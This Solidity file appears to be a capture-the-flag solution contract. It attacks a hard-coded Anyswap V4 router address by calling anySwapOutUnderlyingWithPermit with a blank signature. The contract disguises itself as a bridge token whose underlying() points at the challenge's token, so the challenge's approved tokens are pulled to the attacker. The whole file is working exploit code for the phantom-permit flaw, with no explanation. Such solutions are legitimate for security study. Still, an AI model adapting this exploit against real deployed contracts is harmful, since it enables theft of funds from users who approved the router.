// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Challenge.sol";

interface IFoo {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

contract Solve {
    Challenge chal;
    address constant ANYSWAP_V4_ROUTER = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;

    function solve(address _chal) external {
        chal = Challenge(_chal);
        IFoo(ANYSWAP_V4_ROUTER).anySwapOutUnderlyingWithPermit(
            _chal, address(this), address(this), 1 ether, 1999999999, 0, bytes32(0), bytes32(0), 0
        );
    }

    function underlying() external view returns (address) {
        return address(chal.token());
    }

    function depositVault(uint256, address) external pure returns (uint256) {
        return 0;
    }

    function burn(address, uint256) external pure returns (bool) {
        return true;
    }
}
